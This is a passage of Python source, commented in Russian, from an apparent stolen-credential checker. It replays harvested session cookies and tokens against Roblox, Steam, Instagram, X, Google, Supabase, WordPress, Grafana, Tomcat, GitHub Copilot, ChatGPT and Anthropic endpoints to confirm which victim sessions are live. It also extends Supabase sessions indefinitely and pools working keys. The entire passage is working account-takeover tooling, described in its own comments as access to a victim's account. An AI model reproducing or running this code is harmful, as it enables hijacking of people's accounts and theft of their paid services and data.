            return None
    except Exception:
        return None
    cid = ""
    try:
        pool = {}
        try:
            pool = json.load(open(GCOOKIE_POOL_PATH, encoding="utf-8"))
        except Exception:
            pass
        cid = hashlib.sha1(cookies.encode()).hexdigest()[:12]
        pool[cid] = {"cookies": cookies, "ts": time.time()}
        _atomic_json_dump(GCOOKIE_POOL_PATH, pool)
    except Exception:
        pass
    return {
        "key": cookies[:80] + ("…" if len(cookies) > 80 else ""),
        "base": "https://myaccount.google.com",
        "tag": "gcookie",
        "origin": "gcookie:%s" % cid,
        "ts": time.time(),
        "models": [],
        "n_models": 0,
        "stars_listed": [],
        "stars_working": [],
        "balance": None,
        "tier": "GOOGLE SESSION LIVE (cookies: почта/диск/AI Studio)",
        "usage": None,
        "embed": None,
        "rerank": None,
        "status": "working",
    }


def _sess_rec(key, base, tag, tier, origin):
    # АУДИТ-фикс: ключ храним ПОЛНЫМ (было: обрезка на 500 симв с "…" —
    # Roblox-куки ~900 chars сохранялись в неюзабельном виде: стор
    # уничтожал именно то, что поймал). Усечение — только при рендере.
    return {
        "key": key,
        "base": base,
        "tag": tag,
        "origin": str(origin)[:200],
        "ts": time.time(),
        "models": [],
        "n_models": 0,
        "stars_listed": [],
        "stars_working": [],
        "balance": None,
        "tier": tier,
        "usage": None,
        "embed": None,
        "rerank": None,
        "status": "working",
    }


def validate_roblox(cookie, origin):
    """.ROBLOSECURITY: users.roblox.com/v1/users/authenticated — 200 JSON с
    id/name = живая сессия (ROBUX/предметы). Мёртвая = 401."""
    ck = str(cookie).strip()
    if "\t" in ck:
        parts = ck.split("\t")
        ck = "%s=%s" % (parts[-2], parts[-1])
    if not ck.startswith(".ROBLOSECURITY="):
        m = re.search(r"\.ROBLOSECURITY=[^\s;]{20,}", ck)
        ck = m.group(0) if m else ck
    try:
        r = http(
            "GET",
            "https://users.roblox.com/v1/users/authenticated",
            timeout=(8, 15),
            headers={"Cookie": ck, "User-Agent": UA["User-Agent"]},
        )
        if r is not None and r.status_code == 200:
            j = r.json()
            if j.get("id"):
                return _sess_rec(
                    ck,
                    "https://www.roblox.com",
                    "roblox",
                    "ROBLOX LIVE: %s (id %s) — ROBUX/предметы"
                    % (j.get("name", "?"), j.get("id")),
                    origin,
                )
    except Exception:
        pass
    return None


def validate_steam(cookie, origin):
    """steamLoginSecure: store.steampowered.com/account/ — залогинен = email
    аккаунта в теле; мёртв = редирект на login."""
    ck = str(cookie).strip()
    if "\t" in ck:
        parts = ck.split("\t")
        ck = "%s=%s" % (parts[-2], parts[-1])
    if not ck.startswith("steamLoginSecure="):
        m = re.search(r"steamLoginSecure=[^\s;]{30,}", ck)
        ck = m.group(0) if m else ck
    try:
        r = http(
            "GET",
            "https://store.steampowered.com/account/",
            timeout=(8, 15),
            headers={"Cookie": ck, "User-Agent": UA["User-Agent"]},
        )
        if r is None or r.status_code != 200:
            return None
        if "login" in str(getattr(r, "url", "")).lower():
            return None
        body = (r.text or "").lower()
        if "sign in" in body[:3000] and "account" not in body:
            return None
        # email аккаунта в <span class="account_name">/data-featuretarget
        em = re.search(r"[\w.+-]+@[\w-]+\.[\w.]{2,}", r.text or "")
        if "logout" not in body and "account" not in body:
            return None
        return _sess_rec(
            ck,
            "https://store.steampowered.com",
            "steam",
            "STEAM LIVE%s — игры/баланс/маркет" % (": " + em.group(0) if em else ""),
            origin,
        )
    except Exception:
        pass
    return None


def validate_instagram(cookie, origin):
    """instagram sessionid: /accounts/edit/ 200 = залогинен (редирект на
    login = мертва). Достаём username из страницы."""
    ck = str(cookie).strip()
    if "\t" in ck:
        parts = ck.split("\t")
        ck = "%s=%s" % (parts[-2], parts[-1])
    if "sessionid=" not in ck:
        m = re.search(r"sessionid=[^\s;]{20,}", ck)
        ck = m.group(0) if m else ck
    try:
        r = http(
            "GET",
            "https://www.instagram.com/accounts/edit/",
            timeout=(8, 15),
            headers={"Cookie": ck, "User-Agent": UA["User-Agent"]},
        )
        if r is None or r.status_code != 200:
            return None
        if "login" in str(getattr(r, "url", "")).lower():
            return None
        body = r.text or ""
        if '"username"' not in body and "accounts/edit" not in str(
            getattr(r, "url", "")
        ):
            return None
        um = re.search(r'"username"\s*:\s*"([^"]{1,40})"', body)
        return _sess_rec(
            ck,
            "https://www.instagram.com",
            "instagram",
            "INSTAGRAM LIVE%s" % (": @" + um.group(1) if um else ""),
            origin,
        )
    except Exception:
        pass
    return None


def validate_xtwitter(cookie, origin):
    """X auth_token (+ct0 если есть): api.x.com/1.1/account/settings.json —
    200 = живая сессия. Без ct0 тоже пробуем: cookie-only иногда проходит."""
    ck = str(cookie).strip()
    if "\t" in ck:
        parts = ck.split("\t")
        ck = "%s=%s" % (parts[-2], parts[-1])
    if "auth_token=" not in ck:
        m = re.search(r"auth_token=[0-9a-f]{40}", ck)
        ck = m.group(0) if m else ck
    ct0 = ""
    m0 = re.search(r"ct0=([0-9a-f]{20,})", str(cookie))
    if m0:
        ct0 = m0.group(1)
    try:
        h = {"Cookie": ck, "User-Agent": UA["User-Agent"]}
        if ct0:
            h["x-csrf-token"] = ct0
            h["Cookie"] = ck + "; ct0=" + ct0
        r = http(
            "GET",
            "https://api.x.com/1.1/account/settings.json",
            timeout=(8, 15),
            headers=h,
        )
        if r is not None and r.status_code == 200:
            sn = (r.json() or {}).get("screen_name")
            if sn:
                return _sess_rec(
                    h["Cookie"],
                    "https://x.com",
                    "x-session",
                    "X/TWITTER LIVE: @%s" % sn,
                    origin,
                )
    except Exception:
        pass
    return None


def validate_cursor_web(key, origin):
    """Cursor WorkosCursorSessionToken — это JWT: декодим, проверяем exp,
    достаём email. Офлайн-проверка (как jwt-тег, но с тиром подписки)."""
    tok = str(key).strip()
    m = re.search(r"WorkosCursorSessionToken=(eyJ[A-Za-z0-9_\-.]+)", tok)
    if not m:
        return None
    tok = m.group(1)
    try:
        import base64 as _b

        part = tok.split(".")[1]
        part += "=" * (-len(part) % 4)
        claims = json.loads(_b.urlsafe_b64decode(part.encode()))
    except Exception:
        return None
    exp = int(claims.get("exp") or 0)
    email = claims.get("email") or claims.get("sub") or "?"
    left_h = (exp - time.time()) / 3600 if exp else 0
    if exp and exp < time.time():
        return None  # протух
    return {
        "key": tok,
        "base": "https://www.cursor.com",
        "tag": "cursor-web",
        "origin": str(origin)[:200],
        "ts": time.time(),
        "models": [],
        "n_models": 0,
        "stars_listed": [],
        "stars_working": [],
        "balance": None,
        "tier": "CURSOR WEB SESSION: %s (exp через %.0fч)" % (email, left_h),
        "usage": None,
        "embed": None,
        "rerank": None,
        "status": "working",
    }


def validate_supabase_auth(key, origin):
    """sb-<ref>-auth-token cookie: JSON/base64 {access_token, refresh_token}.
    Живая = POST {supabase-url}/auth/v1/token?grant_type=refresh_token с
    anon-ключом из access_token -> 200 + свежий access (вечная сессия)."""
    raw = str(key).strip()
    m = re.search(r"sb-([a-z0-9]{15,25})-auth-token(?:\.0)?=(.+)", raw)
    if not m:
        return None
    val = htmllib.unescape(m.group(2)).strip()
    try:
        from urllib.parse import unquote as _uq

        val = _uq(val)
    except Exception:
        pass
    if val.startswith("base64-"):
        import base64 as _b

        try:
            val = _b.b64decode(val[7:] + "=" * (-len(val[7:]) % 4)).decode(
                "utf-8", "replace"
            )
        except Exception:
            return None
    try:
        j = json.loads(val)
    except Exception:
        return None
    at = j.get("access_token") or ""
    rt = j.get("refresh_token") or ""
    if not at or not rt:
        return None
    # supabase URL + anon-key из JWT (iss + sub claims)
    try:
        import base64 as _b

        part = at.split(".")[1]
        part += "=" * (-len(part) % 4)
        claims = json.loads(_b.urlsafe_b64decode(part.encode()))
        iss = str(claims.get("iss") or "")
        supa_url = iss.replace("/auth/v1", "") if "/auth/v1" in iss else ""
        if not supa_url.startswith("http"):
            return None
    except Exception:
        return None
    try:
        r = http(
            "POST",
            supa_url + "/auth/v1/token?grant_type=refresh_token",
            timeout=(8, 15),
            headers={
                "apikey": at,
                "Authorization": "Bearer " + at,
                "Content-Type": "application/json",
            },
            json_body={"refresh_token": rt},
        )
        if r is not None and r.status_code == 200:
            jj = r.json()
            new_at = jj.get("access_token") or ""
            email = (jj.get("user") or {}).get("email") or claims.get("email") or "?"
            if new_at:
                return {
                    "key": "%s|refresh_token=%s" % (raw, rt),
                    "base": supa_url,
                    "tag": "supabase-auth",
                    "origin": str(origin)[:200],
                    "ts": time.time(),
                    "models": [],
                    "n_models": 0,
                    "stars_listed": [],
                    "stars_working": [],
                    "balance": None,
                    "tier": "SUPABASE AUTH LIVE: %s (refresh работает — вечная сессия)"
                    % email,
                    "usage": None,
                    "embed": None,
                    "rerank": None,
                    "status": "working",
                }
    except Exception:
        pass
    return None


def validate_supabase_mgmt(key, origin):
    """Supabase Management API token (sbp_<40 hex>): GET
    api.supabase.com/v1/projects Bearer -> 200 = LIVE: список проектов орга
    (БД/стораджи/edge-функции — полный контроль над бэкендами).
    АУДИТ-фикс: тег "supabase" раньше падал в generic-путь с ПУСТЫМИ базами
    -> return None без единого запроса -> токен умирал непроверенным."""
    m = re.search(r"sbp_[a-f0-9]{40}", str(key))
    if not m:
        return None
    tok = m.group(0)
    try:
        r = http(
            "GET",
            "https://api.supabase.com/v1/projects",
            timeout=(8, 15),
            headers={"Authorization": "Bearer " + tok, "User-Agent": "kh"},
        )
        if r is not None and r.status_code == 200:
            projs = r.json() or []
            names = [
                str(p.get("name") or p.get("ref") or "?")[:24]
                for p in projs[:6]
                if isinstance(p, dict)
            ]
            return _simple_rec(
                tok,
                "https://api.supabase.com",
                "supabase",
                "SUPABASE MGMT LIVE: %d проектов (%s) — БД/сторадж/функции орга"
                % (len(projs), ", ".join(names) or "?"),
            )
        if r is not None and r.status_code in (401, 403):
            return None  # точный auth-вердикт: токен мёртв
    except Exception:
        pass
    return _simple_rec(
        tok,
        "https://api.supabase.com",
        "supabase",
        "Supabase mgmt token (сеть флакнула — не проверен)",
        status="listed_only",
    )


# --------------------------------------------------------- КУКИ-ВОЛНА (websess)
# Маркеры залогиненной страницы vs логин-формы (для generic-диффа)
WEBSESS_AUTH_RE = re.compile(
    r"logout|log[\s_]?out|sign[\s_]?out|dashboard|my[\s_]?account|profile|"
    r"user[\s_-]?menu|welcome\s*,|аккаунт|выход|панель\s+управлен|человеко-час",
    re.I,
)
WEBSESS_LOGIN_RE = re.compile(
    r"sign[\s_]?in|log[\s_]?in|login|password|пароль|войти|username|e-?mail",
    re.I,
)


def _websess_origin_bases(origin):
    """origin "shodan:ip:port" | "open-infra:litellm:ip:port" | "leakix:host"
    | "shodan-live:https://ip:port/path" -> candidate-базы (обе схемы)."""
    o = str(origin or "")
    um = re.search(r"https?://[A-Za-z0-9.\-]+(?::\d{2,5})?", o)
    if um:
        return [um.group(0)]
    m = re.search(r"(\d{1,3}(?:\.\d{1,3}){3})(?::(\d{2,5}))?", o)
    if m:
        ip, port = m.group(1), m.group(2)
        if port:
            pref = "https" if port in ("443", "8443") else "http"
            alt = "http" if pref == "https" else "https"
            return ["%s://%s:%s" % (pref, ip, port), "%s://%s:%s" % (alt, ip, port)]
        return ["https://" + ip, "http://" + ip]
    dm = re.search(
        r"(?:leakix|urlscan|direct|zoomeye|fofa|censys)[:\s]"
        r"([A-Za-z0-9.\-]+\.[A-Za-z]{2,})",
        o,
    )
    if dm:
        return ["https://" + dm.group(1), "http://" + dm.group(1)]
    return []


def _websess_get(url, cookie=None, timeout=(5, 12)):
    headers = dict(UA)
    if cookie:
        headers["Cookie"] = cookie
    try:
        return requests.get(
            url,
            headers=headers,
            timeout=timeout,
            verify=False,
            allow_redirects=False,
        )
    except Exception:
        return None


def _websess_record(cookie, base, framework, evidence, origin):
    """Полная кука в key (не режем — иначе recheck не сможет перепроверить)."""
    return {
        "key": cookie[:2000],
        "base": base,
        "tag": "websess",
        "origin": str(origin)[:200],
        "ts": time.time(),
        "models": [],
        "n_models": 0,
        "stars_listed": [],
        "stars_working": [],
        "balance": None,
        "tier": "WEB-СЕССИЯ %s%s" % (framework, evidence),
        "usage": None,
        "embed": None,
        "rerank": None,
        "status": "working",
    }


def _websess_netscape(block, origin):
    """Netscape cookies.txt-блок: группируем куки по домену (НЕ-google),
    реплей cookie-header на домен куки + дифф с анонимным запросом."""
    per_dom = {}
    for ln in block.splitlines():
        parts = ln.split("\t")
        if len(parts) < 7:
            continue
        dom = parts[0].lstrip(".").strip()
        name, val = parts[-2], parts[-1]
        if not dom or not name or not val or len(val) < 6:
            continue
        if "google" in dom or "googleapis" in dom:
            continue  # гугловые ловит gcookie-механика (пул + deep-scan)
        if not re.match(r"^[A-Za-z0-9.\-]+\.[A-Za-z]{2,}$", dom):
            continue
        per_dom.setdefault(dom, []).append((name, val))
    for dom, pairs in list(per_dom.items())[:3]:
        cookie = "; ".join("%s=%s" % (n, v) for n, v in pairs[:15])
        for scheme in ("https", "http"):
            base = scheme + "://" + dom
            r = _websess_get(base + "/", cookie)
            if r is None:
                continue  # схема не отвечает — пробуем вторую
            if (
                r.status_code == 200
                and len(r.text or "") > 300
                and WEBSESS_AUTH_RE.search(r.text)
                and not WEBSESS_LOGIN_RE.search((r.text or "")[:3000])
            ):
                ra = _websess_get(base + "/", None)
                if (
                    ra is None
                    or ra.status_code != 200
                    or not WEBSESS_AUTH_RE.search(ra.text or "")
                ):
                    return _websess_record(
                        cookie,
                        base,
                        "COOKIE-JAR (%d кук)" % len(pairs),
                        " @ %s" % dom,
                        origin,
                    )
            break  # домен ответил — вторую схему не терзаем
    return None


def validate_websess(cookie, origin):
    """Web-сессия (кука из лог-дампов/конфигов/cookies.txt): реплей куки на
    origin-хост. Живая = залогиненный доступ к панели/аккаунту жертвы.
    Framework-aware: grafana /api/user, WP /wp-admin/, tomcat /manager/html;
    прочие — дифф: с кукой auth-маркеры, без куки логин-форма/та же страница."""
    cookie = htmllib.unescape(str(cookie)).strip().strip('"').strip()
    if len(cookie) < 10 or "=" not in cookie:
        return None
    if PLACEHOLDER_SUBSTR_RE.search(cookie) or JUNKY_KEY_RE.search(cookie):
        return None
    # АУДИТ-фикс: length-guard стоял ДО netscape-ветки — многострочные
    # cookies.txt-дампы (>2000 симв — норма для джаров) отбрасывались
    # не глядя. Netscape обрабатываем первым, лимит — для одиночных куков.
    if "\t" in cookie:
        return _websess_netscape(cookie, origin)
    if len(cookie) > 2000:
        return None
    m = re.match(r"([A-Za-z0-9_.\-]{1,40})=", cookie)
    cname = (m.group(1) if m else "").lower()
    if not cname:
        return None
    bases = _websess_origin_bases(origin)
    if not bases:
        return None
    # — Grafana: /api/user 200 + login в json = живая юзер/админ-сессия
    if cname == "grafana_session":
        for base in bases:
            r = _websess_get(base + "/api/user", cookie)
            if r is not None and r.status_code == 200:
                try:
                    j = r.json()
                    if isinstance(j, dict) and (j.get("login") or j.get("name")):
                        return _websess_record(
                            cookie,
                            base,
                            "GRAFANA",
                            " (user: %s, orgRole: %s)"
                            % (j.get("login", "?"), j.get("orgRole", "?")),
                            origin,
                        )
                except Exception:
                    pass
        return None
    # — WordPress: /wp-admin/ 200 = залогинены (аноним -> 302 на wp-login)
    if cname.startswith("wordpress_logged_in") or cname.startswith("wordpress_sec"):
        for base in bases:
            for path in ("/wp-admin/", "/wp-admin/index.php"):
                r = _websess_get(base + path, cookie)
                if r is not None and r.status_code == 200 and len(r.text) > 500:
                    if "wpbody" in r.text or "wp-admin" in r.text.lower()[:3000]:
                        return _websess_record(
                            cookie, base, "WORDPRESS admin", "", origin
                        )
        return None
    # — Java: tomcat manager с валидной сессией -> 200 (аноним 401)
    if cname == "jsessionid":
        for base in bases:
            r0 = _websess_get(base + "/", cookie)
            if r0 is None:
                continue
            for path in ("/manager/html", "/admin", "/console"):
                r = _websess_get(base + path, cookie)
                if (
                    r is not None
                    and r.status_code == 200
                    and len(r.text) > 500
                    and not WEBSESS_LOGIN_RE.search(r.text[:3000])
                ):
                    return _websess_record(cookie, base, "JAVA %s" % path, "", origin)
            break  # хост ответил — вторую схему не дёргаем
    # — generic: дифф по типовым путям (laravel/php/express/.NET/cookie-jar)
    for base in bases:
        r0 = _websess_get(base + "/", cookie)
        if r0 is None:
            continue  # схема мертва — пробуем вторую
        pre = {"/": r0}  # "/" уже сфетчен — не дублируем запрос
        for path in ("/", "/admin", "/dashboard", "/api/user", "/user", "/home"):
            r = pre[path] if path in pre else _websess_get(base + path, cookie)
            if r is None or r.status_code != 200 or len(r.text) < 300:
                continue
            body = r.text
            if WEBSESS_LOGIN_RE.search(body[:3000]) and not WEBSESS_AUTH_RE.search(
                body
            ):
                continue  # логин-форма
            if not WEBSESS_AUTH_RE.search(body):
                continue  # нет признаков залогиненности
            # контроль анонимом: публичная страница с теми же маркерами = фолс
            ra = _websess_get(base + path, None)
            if ra is not None and ra.status_code == 200:
                if WEBSESS_AUTH_RE.search(ra.text or ""):
                    continue  # маркеры публичные — не сессия
                if (ra.text or "") == body:
                    continue  # кука ничего не меняет
            return _websess_record(
                cookie, base, "SESSION (%s)" % cname, " @ %s" % path, origin
            )
        break  # база отвечала — вторую схему не терзаем
    return None


def validate_jwt(key, origin):
    """JWT из API-дампов: локальный decode (без сети), claims -> tier.
    Истёкшие/анонимные (без identity-полей) — мимо. GitHub-iss — live-проверка."""
    try:
        import base64 as _b64

        def _d(x):
            return _b64.urlsafe_b64decode(x + "=" * (-len(x) % 4))

        h, p, _sig = key.split(".")
        header = json.loads(_d(h).decode("utf-8", "replace"))
        payload = json.loads(_d(p).decode("utf-8", "replace"))
        if not isinstance(header, dict) or not isinstance(payload, dict):
            return None
        if str(header.get("alg", "")).lower() == "none":
            return None
    except Exception:
        return None
    exp = payload.get("exp")
    try:
        if exp and float(exp) < time.time():
            return None  # истёк
    except Exception:
        pass
    # док-примеры (jwt.io/тесты): John Doe / sub=1234567890
    if str(payload.get("sub")) == "1234567890" or payload.get("name") == "John Doe":
        return None
    iss = str(payload.get("iss") or payload.get("aud") or "?")[:100]
    # — supabase: anon = публичный by design (мусор); service_role = ключ
    # к БД проекта -> LIVE-проба /rest/v1 с apikey+Bearer (200 = полный доступ)
    if "supabase" in iss.lower():
        role = str(payload.get("role") or "")
        if role != "service_role":
            return None
        ref = str(payload.get("ref") or "")
        if not re.match(r"^[a-z0-9]{16,24}$", ref):
            return None
        try:
            r = http(
                "GET",
                "https://%s.supabase.co/rest/v1/" % ref,
                timeout=(8, 15),
                headers={"apikey": key, "Authorization": "Bearer " + key},
            )
            if r is not None and r.status_code == 200:
                return {
                    "key": key,
                    "base": "https://%s.supabase.co" % ref,
                    "tag": "jwt",
                    "origin": str(origin)[:200],
                    "ts": time.time(),
                    "models": [],
                    "n_models": 0,
                    "stars_listed": [],
                    "stars_working": [],
                    "balance": None,
                    "tier": "SUPABASE service_role LIVE (ref=%s: REST/DB проекта)"
                    % ref,
                    "usage": None,
                    "embed": None,
                    "rerank": None,
                    "status": "working",
                }
        except Exception:
            pass
        return None
    # сессионные JWT без привилегий (свежие куки краулера: только sub/iss/aud/
    # jti/m — focusschoolsoftware-шторм из access_token-запроса) -> мусор.
    # Оставляем только с ролью/правами/identity: role, permissions, email, prv...
    priv = [
        k
        for k in (
            "role",
            "permissions",
            "type",
            "email",
            "username",
            "name",
            "user_id",
            "org",
            "organisation_id",
            "prv",
            "scope",
            "scopes",
            "admin",
        )
        if payload.get(k) not in (None, "", [], {})
    ]
    if not priv:
        return None
    sub = str(payload.get("sub") or payload.get("email") or "")[:60]
    claims = ", ".join(
        "%s=%s" % (k, str(v)[:36]) for k, v in list(payload.items())[:6] if k != "iat"
    )[:220]
    # GitHub-аудитория: проверим живость
    if "github" in iss.lower():
        try:
            r = http(
                "GET",
                "https://api.github.com/user",
                timeout=(8, 15),
                headers={"Authorization": "Bearer " + key, "User-Agent": "kh"},
            )
            if r is not None and r.status_code == 200:
                login = (r.json() or {}).get("login", "?")
                return {
                    "key": key,
                    "base": "https://api.github.com",
                    "tag": "jwt",
                    "origin": str(origin)[:200],
                    "ts": time.time(),
                    "models": [],
                    "n_models": 0,
                    "stars_listed": [],
                    "stars_working": [],
                    "balance": None,
                    "tier": "JWT GitHub LIVE (user: %s)" % login,
                    "usage": None,
                    "embed": None,
                    "rerank": None,
                    "status": "working",
                }
        except Exception:
            pass
        return None
    return {
        "key": key,
        "base": iss,
        "tag": "jwt",
        "origin": str(origin)[:200],
        "ts": time.time(),
        "models": [],
        "n_models": 0,
        "stars_listed": [],
        "stars_working": [],
        "balance": None,
        "tier": "JWT iss=%s sub=%s (%s)" % (iss, sub, claims),
        "usage": None,
        "embed": None,
        "rerank": None,
        "status": "listed_only",
    }


def validate_github_token(key):
    """🐙 gh-токен: /user 200 = валид (в пул сканера). Бонус-алмаз: у акка есть
    COPILOT-подписка -> api.githubcopilot.com/models 200 = бесплатные
    GPT/Claude/Opus через copilot-прокси."""
    try:
        r = http(
            "GET",
            "https://api.github.com/user",
            timeout=(6, 15),
            headers={
                "Authorization": "Bearer " + key,
                "Accept": "application/vnd.github+json",
            },
        )
        if r.status_code != 200:
            return None
        login = r.json().get("login") or "?"
    except Exception:
        return None
    copilot = False
    try:
        # ПРАВИЛЬНЫЙ флоу (было: raw gh-токен на api.githubcopilot.com = всегда
        # 401, sweep находил ноль): сначала обмен на copilot-сессию.
        # /copilot_internal/v2/token 200 только при ЖИВОЙ подписке Copilot.
        rt = http(
            "GET",
            "https://api.github.com/copilot_internal/v2/token",
            timeout=(6, 15),
            headers={
                "Authorization": "Bearer " + key,
                "Accept": "application/vnd.github+json",
                "Editor-Version": "vscode/1.95.0",
            },
        )
        ctok = None
        if rt is not None and rt.status_code == 200:
            try:
                ctok = (rt.json() or {}).get("token")
            except Exception:
                ctok = None
        if ctok:
            rc = http(
                "GET",
                "https://api.githubcopilot.com/models",
                timeout=(6, 15),
                headers={
                    "Authorization": "Bearer " + ctok,
                    "Editor-Version": "vscode/1.95.0",
                    "Editor-Plugin-Version": "copilot-chat/0.26.0",
                    "Copilot-Integration-Id": "vscode-chat",
                    "User-Agent": "GitHubCopilotChat/0.26.0",
                },
            )
            copilot = rc is not None and rc.status_code == 200
    except Exception:
        pass
    return {
        "key": key,
        "base": "https://api.githubcopilot.com"
        if copilot
        else "https://api.github.com",
        "tag": "github-token",
        "origin": "gh-token-validator",
        "ts": time.time(),
        "models": ["copilot: gpt/claude/gemini"] if copilot else [],
        "n_models": 1 if copilot else 0,
        "stars_listed": ["copilot"] if copilot else [],
        "stars_working": ["copilot"] if copilot else [],
        "balance": None,
        "tier": ("🐙 COPILOT SUB @%s" % login) if copilot else ("gh token @%s" % login),
        "usage": None,
        "embed": None,
        "rerank": None,
        "status": "working" if copilot else "listed_only",
    }


def validate_codex(key, web=False):
    """🎫 Codex/ChatGPT: живой токен = ChatGPT Plus/Pro подписка (Codex CLI +
    веб). /backend-api/me отвечает профилем аккаунта. web=True — куки-сессия
    __Secure-next-auth.session-token вместо Bearer."""
    hdrs = {"User-Agent": UA["User-Agent"]}
    if web:
        hdrs["Cookie"] = "__Secure-next-auth.session-token=%s" % key
    else:
        hdrs["Authorization"] = "Bearer " + key
    try:
        r = http(
            "GET",
            "https://chatgpt.com/backend-api/me",
            timeout=(6, 15),
            headers=hdrs,
        )
        if r.status_code != 200:
            return None
        j = r.json()
        email = j.get("email") or j.get("name") or "?"
        # план: /backend-api/accounts/check не всегда доступен — фиксируем факт
        return {
            "key": key,
            "base": "https://chatgpt.com/backend-api",
            "tag": "codex-web" if web else "codex",
            "origin": "codex-validator",
            "ts": time.time(),
            "models": ["gpt-5.2-codex", "gpt-5.2", "codex-mini"],
            "n_models": 3,
            "stars_listed": ["gpt-5.2-codex"],
            "stars_working": ["gpt-5.2-codex"],
            "balance": None,
            "tier": "ChatGPT/Codex SUB (%s)" % email,
            "usage": None,
            "embed": None,
            "rerank": None,
            "status": "working",
        }
    except Exception:
        return None


def validate_anthropic(key):
    base = "https://api.anthropic.com"
    # OAuth токены (sk-ant-oat01) работают только через Bearer + oauth-beta хедер
    if key.startswith("sk-ant-oat"):
        h = {
            "Authorization": "Bearer " + key,
            "anthropic-version": "2023-06-01",
            "anthropic-beta": "oauth-2025-04-20",  # без него 401 на живых oat01!
            "Content-Type": "application/json",
        }
    else:
        h = {
            "x-api-key": key,
            "anthropic-version": "2023-06-01",
            "Content-Type": "application/json",
        }
    try:
        r = http(
            "POST",
            base + "/v1/messages",
            timeout=(10, 30),
            headers=h,
            json_body={
                "model": "claude-haiku-4-5-20251001",
                "max_tokens": 4,
                "messages": [{"role": "user", "content": "hi"}],
            },
        )
        if r.status_code == 200:
            # ТИР-ТЕСТ: haiku работает и у free! sonnet=PRO, opus=MAX
            tier = _oat01_tier(key) if key.startswith("sk-ant-oat") else "api03"
            # РЕАЛЬНЫЙ список моделей аккаунта (не хардкод!)
            models_real, stars_real = [], []
            try:
                rm = http("GET", base + "/v1/models", timeout=(6, 12), headers=h)
                if rm.status_code == 200:
                    models_real = [
                        m.get("id")
                        for m in rm.json().get("data") or []
                        if isinstance(m, dict) and m.get("id")
                    ]
                    stars_real = [m for m in models_real if m and STAR_RE.search(m)]
            except Exception:
                pass
            # free-tier: не "working", чтобы не засирать находки
            is_free = tier == "free"
            return {
                "key": key,
                "base": base + "/v1",
                "tag": "anthropic",
                "origin": "direct",
                "ts": time.time(),
                "models": models_real
                or [
                    "claude-opus-4-8",
                    "claude-opus-4-7",
                    "claude-opus-5",
                    "claude-fable-5",
                    "claude-sonnet-5",
                    "claude-haiku-4-5-20251001",
                ],
                "n_models": len(models_real) or 6,
                "stars_listed": stars_real
                or [
                    "claude-opus-4-8",
                    "claude-opus-5",
                    "claude-fable-5",
                    "claude-sonnet-5",
                    "claude-opus-4-7",
                ],
                "stars_working": [],
                "balance": None,
                "tier": ("Anthropic OAuth [%s]" % tier)
                if key.startswith("sk-ant-oat")
                else "Anthropic official",
                "usage": None,
                "embed": None,
                "rerank": None,
                "status": "listed_only" if is_free else "working",
                "note": "haiku 200 OK, тир: %s%s"
                % (
                    tier,
                    " (free-tier: sonnet/opus недоступны)" if is_free else "",
                ),
            }
        if r.status_code == 429:
            # 429 rate_limit = ТОКЕН ЖИВ (auth прошла!), окно 5h/7d выжжено.
            # Раньше: return None -> seen -> потерян НАВСЕГДА. Теперь храним —
            # recheck поймает сброс окна. Tier НЕ пробуем: все пробы дадут 429.
            return {
                "key": key,
                "base": base + "/v1",
                "tag": "anthropic",
                "origin": "direct",
                "ts": time.time(),
                "models": [],
                "n_models": 0,
                "stars_listed": [],
                "stars_working": [],
                "balance": None,
                "tier": ("Anthropic OAuth [429-окно выжжено]")
                if key.startswith("sk-ant-oat")
                else "Anthropic official [429 rate-limit]",
                "usage": None,
                "embed": None,
                "rerank": None,
                "status": "listed_only",
                "note": "429 rate-limit: токен ВАЛИДЕН (auth прошла), окно исчерпано — ждём сброса",
            }
        # Cloudflare-блок датацентрового IP / перегрузка — НЕ смерть ключа!
        # (403 без auth-маркеров, 529 overloaded, 5xx) -> unverified для ретрая
        state, _ = classify_chat(r.status_code, r.text)
        if r.status_code in (403, 500, 502, 503, 529) and state not in (
            "invalid_key",
            "no_balance",
        ):
            return {
                "key": key,
                "base": base + "/v1",
                "tag": "anthropic",
                "origin": "direct",
                "ts": time.time(),
                "models": [],
                "n_models": 0,
                "stars_listed": [],
                "stars_working": [],
                "balance": None,
                "tier": None,
                "usage": None,
                "embed": None,
                "rerank": None,
                "status": "unverified",
                "note": "HTTP %s от anthropic (CF-блок/перегруз) — ретрай"
                % r.status_code,
            }
        # пробуем уловить no-balance
        if state == "no_balance":
            return {
                "key": key,
                "base": base + "/v1",
                "tag": "anthropic",
                "origin": "direct",
                "ts": time.time(),
                "models": [],
                "n_models": 0,
                "stars_listed": [],
                "stars_working": [],
                "balance": None,
                "tier": None,
                "usage": None,
                "embed": None,
                "rerank": None,
                "status": "no_balance",
                "note": "ключ валиден, но баланс исчерпан (credit balance low)",
            }
    except Exception:
        # СЕТЬ/таймаут к api.anthropic.com — это НЕ смерть ключа!
        # Раньше: None -> seen -> потерян навсегда. Теперь: unverified -> ретрай.
        return {
            "key": key,
            "base": base + "/v1",
            "tag": "anthropic",
            "origin": "direct",
            "ts": time.time(),
            "models": [],
            "n_models": 0,
            "stars_listed": [],
            "stars_working": [],
            "balance": None,
            "tier": None,
            "usage": None,
            "embed": None,
            "rerank": None,
            "status": "unverified",
            "note": "сетевая ошибка к api.anthropic.com — ретрай в след. цикле",
        }
    return None


# --- пер-цикловый кэш недоступных бордов -------------------------------------
# тэглесс sk-ключ пробуется по ~150 relay-бордам; ~130 из них — мёртвые хосты,
# которые держат connect до таймаута (× proxy+direct в http()). Без кэша КАЖДЫЙ
# тэглесс-ключ цикла заново ждёт эти 130 бордов. Здесь: борд, не ответивший
# на сетевом уровне, помечается недоступным до конца цикла и пропускается.
_BOARD_HEALTH_LOCK = threading.Lock()
_BOARD_UNREACHABLE = set()


def reset_board_health():
    """Сброс кэша доступности бордов — вызывать в начале каждого цикла."""
    with _BOARD_HEALTH_LOCK:
        _BOARD_UNREACHABLE.clear()


def _models_probe_fast(base, key):
    """Discovery-проба /models (без чата) — для фазы поиска базы у тэглесс-ключей.
    Возвращает список моделей | None.

    БЕЗ вложенного пула (в отличие от probe_models): чтобы фаза 1 могла держать
    много воркеров без взрыва потоков. Fail-fast: если ПЕРВЫЙ запрос падает на
    сетевом уровне — борд мёртв, не тратим ещё 3 таймаут-окна, помечаем
    недоступным до конца цикла. Короткий connect-таймаут: борд, к которому не
    достучаться за ~2.5с, для этого ключа бесполезен."""
    base_r = base.rstrip("/")
    with _BOARD_HEALTH_LOCK:
        if base_r in _BOARD_UNREACHABLE:
            return None
    suffixes = ("/models",) if base_r.endswith("/v1") else ("/models", "/v1/models")
    # Bearer покрывает большинство; x-api-key — anthropic-релеи, которые 401'ят
